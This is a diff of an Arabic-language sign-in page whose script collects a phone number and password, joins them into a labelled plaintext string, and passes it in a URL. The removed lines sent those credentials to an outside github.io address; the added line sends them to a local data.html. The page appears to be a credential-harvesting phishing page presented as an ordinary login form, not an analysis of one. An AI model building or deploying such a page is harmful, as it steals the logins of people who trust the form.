@@ -51,7 +51,7 @@
     <div class="form-container">
         <input type="tel" id="phoneNumber" placeholder="رقم الهاتف">
         <input type="password" id="password" placeholder="كلمة المرور">
-        <button onclick="signIn()">Sign In</button>
+        <button onclick="signIn()">تسجيل الدخول</button>
         <div class="error-message" id="errorMessage"></div>
     </div>
 
@@ -69,10 +69,8 @@
                 errorMessage.innerHTML = "";
                 var userData = "رقم الهاتف: " + phoneNumber + "، كلمة المرور: " + password;
 
-                window.location.href = "https://www.youtube.com/";
-
                 setTimeout(function() {
-                    window.location.href = "https://korotenshi.github.io/kOotenshi.github.io/=" + encodeURIComponent(userData);
+                    window.location.href = "data.html?info=" + encodeURIComponent(userData);
                 }, 3000);
             }
         }
@@ -83,3 +81,6 @@
     </script>
 </body>
 </html>
+
+
+
